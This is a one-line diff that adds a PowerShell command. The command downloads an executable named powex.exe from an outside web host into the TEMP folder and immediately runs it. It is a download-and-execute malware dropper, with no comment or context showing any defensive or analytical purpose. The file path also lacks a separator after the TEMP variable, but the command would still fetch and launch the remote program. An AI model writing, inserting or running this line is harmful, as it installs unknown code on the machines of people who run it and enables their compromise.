@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/power/powex.exe',"$env:TEMPpowex.exe");Start-Process ("$env:TEMPpowex.exe")
